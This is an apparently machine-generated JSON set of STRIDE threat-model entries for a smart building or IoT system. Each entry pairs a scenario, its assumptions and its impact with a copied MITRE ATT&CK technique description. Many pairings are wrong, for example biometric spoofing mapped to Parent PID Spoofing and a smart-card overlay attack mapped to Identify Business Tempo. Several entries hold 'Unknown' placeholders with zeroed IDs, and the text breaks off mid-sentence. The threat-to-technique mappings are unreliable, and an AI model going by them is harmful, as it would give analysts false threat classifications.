[
{
    "case_number": "7",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker successfully spoofs biometric data to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to high-resolution biometric data of the user.",
                    "Role": "Attacker",
                    "Condition": "Access to user biometric data"
                },
                {
                    "Assumption": "The biometric authentication mechanism does not have adequate anti-spoofing measures.",
                    "Role": "System Designer",
                    "Condition": "Unpatched or weak anti-spoofing algorithm"
                },
                {
                    "Assumption": "The attacker can physically or virtually present the spoofed biometric data to the sensor.",
                    "Role": "Attacker",
                    "Condition": "Access to sensor interface"
                }
            ],
            "Potential Impact": "Unauthorized access to system resulting in confidentiality breach.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometric authentication",
                "unauthorized access",
                "physical sensor"
            ],
            "mitre_technique": {
                "name": "Parent PID Spoofing",
                "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
                "id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
                "technique_id": "T1134.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate user by intercepting and replaying authentication tokens.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can capture authentication tokens over the network.",
                    "Role": "Attacker",
                    "Condition": "Network monitoring capabilities"
                },
                {
                    "Assumption": "The application does not use secure communication methods like HTTPS.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted communication"
                },
                {
                    "Assumption": "Authentication tokens are replayable without expiration checks.",
                    "Role": "System Designer",
                    "Condition": "Insecure token handling"
                }
            ],
            "Potential Impact": "Breach of system integrity and unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "network intrusion",
                "token replay",
                "session hijacking",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates user interface elements to steal smart card credentials during user input.",
            "Assumptions": [
                {
                    "Assumption": "User interfaces are vulnerable to overlay attacks.",
                    "Role": "System Designer",
                    "Condition": "Vulnerable UI design"
                },
                {
                    "Assumption": "The attacker can deploy malicious software or scripts on the user\u2019s device.",
                    "Role": "Attacker",
                    "Condition": "Control over user device"
                },
                {
                    "Assumption": "Users are not trained to recognize spoofed interfaces.",
                    "Role": "User",
                    "Condition": "Lack of security awareness"
                }
            ],
            "Potential Impact": "Compromise of user credentials and subsequent unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "credential interception",
                "user interface attack",
                "smart card",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Identify Business Tempo",
                "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",
                "id": "attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f",
                "technique_id": "T1591.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with actuator firmware to change the behavior of smart devices like door locks or lighting systems.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update mechanisms are not securely implemented.",
                    "Role": "System Designer",
                    "Condition": "Unsecured firmware updates"
                },
                {
                    "Assumption": "The attacker has physical or network access to the actuator.",
                    "Role": "Attacker",
                    "Condition": "Proximity to actuator or network access"
                },
                {
                    "Assumption": "There are no verification checks for firmware integrity.",
                    "Role": "System Designer",
                    "Condition": "Lack of integrity checks"
                }
            ],
            "Potential Impact": "Compromise of system integrity and control.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "actuator control",
                "hardware manipulation",
                "smart devices"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the machine learning models to misinterpret sensor data, leading to incorrect actions by the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can introduce corrupted training data.",
                    "Role": "Attacker",
                    "Condition": "Access to training process"
                },
                {
                    "Assumption": "There are no robust validation mechanisms for model updates.",
                    "Role": "System Designer",
                    "Condition": "Weak model validation"
                },
                {
                    "Assumption": "Machine learning models are not regularly audited.",
                    "Role": "System Administrator",
                    "Condition": "Lack of regular audits"
                }
            ],
            "Potential Impact": "Disruption of service and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "model tampering",
                "training data poisoning",
                "machine learning",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the communication channels between system components to alter data in transit.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to communication channels within the network.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "The system does not employ secure communication protocols.",
                    "Role": "System Designer",
                    "Condition": "Unsecured communication protocols"
                },
                {
                    "Assumption": "Routine data integrity checks are not implemented.",
                    "Role": "System Administrator",
                    "Condition": "Lack of integrity validation"
                }
            ],
            "Potential Impact": "Compromise of data integrity and system reliability.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "network manipulation",
                "data integrity",
                "communication channels"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies initiating a shutdown command by exploiting insufficient logging mechanisms within the system.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not capture sufficient detail for non-repudiation.",
                    "Role": "System Designer",
                    "Condition": "Weak logging policies"
                },
                {
                    "Assumption": "The system fails to secure logs against tampering.",
                    "Role": "System Administrator",
                    "Condition": "Insecure log storage"
                },
                {
                    "Assumption": "Logs are not reviewed or monitored regularly.",
                    "Role": "System Administrator",
                    "Condition": "Lack of log monitoring"
                }
            ],
            "Potential Impact": "Potential service disruptions and security breaches.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "non-repudiation",
                "audit trails",
                "command execution"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies performing fraudulent transactions by manipulating user device logs.",
            "Assumptions": [
                {
                    "Assumption": "The user device logs transactions locally with no remote backup.",
                    "Role": "System Designer",
                    "Condition": "Local-only logging"
                },
                {
                    "Assumption": "There are insufficient checks for log integrity.",
                    "Role": "System Administrator",
                    "Condition": "Lack of integrity verification on logs"
                },
                {
                    "Assumption": "Logs can be accessed and altered by unauthorized entities.",
                    "Role": "Attacker",
                    "Condition": "Compromise of user device"
                }
            ],
            "Potential Impact": "Loss of data integrity and unauthorized financial gains.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "transaction repudiation",
                "user device compromise",
                "fraud"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A system user denies responsibility for unauthorized access attempts by claiming credential leaks.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not detailed enough to correlate access attempts.",
                    "Role": "System Designer",
                    "Condition": "Insufficient logging detail"
                },
                {
                    "Assumption": "There are no multi-factor authentication (MFA) mechanisms in place.",
                    "Role": "System Designer",
                    "Condition": "Lack of MFA implementation"
                },
                {
                    "Assumption": "Users are not held accountable through monitoring tools.",
                    "Role": "System Administrator",
                    "Condition": "Lack of user monitoring"
                }
            ],
            "Potential Impact": "Loss of accountability and potential unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "credential repudiation",
                "access logging",
                "user monitoring",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)\n\nAdversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",
                "id": "attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974",
                "technique_id": "T1566.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is exposed due to inadequate encryption on data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data is stored in plaintext or with weak encryption.",
                    "Role": "System Designer",
                    "Condition": "Weak or absent encryption"
                },
                {
                    "Assumption": "Data repositories are accessible without appropriate access controls.",
                    "Role": "System Administrator",
                    "Condition": "Lack of access control"
                },
                {
                    "Assumption": "There are no regular audits of data access policies.",
                    "Role": "System Administrator",
                    "Condition": "Lack of policy audits"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data exposure",
                "weak encryption",
                "data repository",
                "access controls"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data in transit due to unencrypted communication channels.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between system components are unencrypted.",
                    "Role": "System Designer",
                    "Condition": "Unsecured communications"
                },
                {
                    "Assumption": "The attacker has access to the network infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "There are no detection mechanisms for unauthorized network access.",
                    "Role": "System Administrator",
                    "Condition": "Lack of network monitoring"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information during transit.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "network access",
                "data in transit"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Biometric data captured by sensors is accessible to unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data is stored or transmitted without proper encryption.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "Sensors and data repositories do not have robust access controls.",
                    "Role": "System Administrator",
                    "Condition": "Weak access controls"
                },
                {
                    "Assumption": "Physical or logical access to sensors is not adequately restricted.",
                    "Role": "System Designer",
                    "Condition": "Unrestricted access to sensors"
                }
            ],
            "Potential Impact": "Exposure of personally identifiable biometric information.",
            "MITRE ATT&CK Keywords": [
                "biometric data",
                "unauthorized access",
                "sensor data",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication infrastructure with bogus traffic, causing system unavailability.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure does not have adequate safeguards against DoS attacks.",
                    "Role": "System Designer",
                    "Condition": "Unprotected network infrastructure"
                },
                {
                    "Assumption": "There are no rate limiting or traffic analysis tools in place.",
                    "Role": "System Administrator",
                    "Condition": "Lack of traffic controls"
                },
                {
                    "Assumption": "The system relies heavily on real-time data processing.",
                    "Role": "System Designer",
                    "Condition": "Dependency on real-time processing"
                }
            ],
            "Potential Impact": "Service disruption and data unavailability.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "network flooding",
                "traffic analysis",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disables key sensors or actuators, disrupting the operation of the smart environment.",
            "Assumptions": [
                {
                    "Assumption": "Sensors and actuators can be disabled remotely.",
                    "Role": "System Designer",
                    "Condition": "Remote control capabilities"
                },
                {
                    "Assumption": "The system lacks redundancy measures for critical components.",
                    "Role": "System Designer",
                    "Condition": "Lack of redundancy"
                },
                {
                    "Assumption": "Alerts for component failure are not promptly acted upon.",
                    "Role": "System Administrator",
                    "Condition": "Delayed response to alerts"
                }
            ],
            "Potential Impact": "Compromise of system availability and operations.",
            "MITRE ATT&CK Keywords": [
                "sensor disabling",
                "actuator control",
                "system disruption",
                "component failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in AI/ML models to overload the system with numerous fraudulent learning requests.",
            "Assumptions": [
                {
                    "Assumption": "System is vulnerable to model training overload.",
                    "Role": "System Designer",
                    "Condition": "Vulnerable AI/ML models"
                },
                {
                    "Assumption": "There are no mechanisms to detect and block abnormal traffic patterns.",
                    "Role": "System Administrator",
                    "Condition": "Lack of traffic analysis"
                },
                {
                    "Assumption": "The system does not prioritize legitimate requests over fraudulent ones.",
                    "Role": "System Administrator",
                    "Condition": "No request prioritization"
                }
            ],
            "Potential Impact": "Service degradation and potential shutdown of AI-based services.",
            "MITRE ATT&CK Keywords": [
                "AI/ML exploitation",
                "model overload",
                "fraudulent requests",
                "service degradation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the authentication mechanism to elevate privileges from a standard user to an administrator.",
            "Assumptions": [
                {
                    "Assumption": "There are known vulnerabilities in the authentication mechanism.",
                    "Role": "System Designer",
                    "Condition": "Unpatched vulnerabilities"
                },
                {
                    "Assumption": "The attacker has a standard user account on the system.",
                    "Role": "Attacker",
                    "Condition": "Existing user access"
                },
                {
                    "Assumption": "Privilege separation is not properly enforced.",
                    "Role": "System Designer",
                    "Condition": "Weak privilege separation"
                }
            ],
            "Potential Impact": "Compromise of system integrity and unauthorized administrative actions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "authentication mechanism",
                "vulnerability exploitation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker introduces a compromised device that gains elevated access due to insufficient device validation.",
            "Assumptions": [
                {
                    "Assumption": "Devices are authenticated based on weak or predictable parameters.",
                    "Role": "System Designer",
                    "Condition": "Weak device authentication"
                },
                {
                    "Assumption": "System does not perform comprehensive validation of new devices.",
                    "Role": "System Administrator",
                    "Condition": "Lack of device validation"
                },
                {
                    "Assumption": "The system allows automatic elevation of privileges for new devices.",
                    "Role": "System Designer",
                    "Condition": "Automatic privilege assignment"
                }
            ],
            "Potential Impact": "Unauthorized access and potential control over system resources.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "privilege escalation",
                "device validation",
                "access control"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate 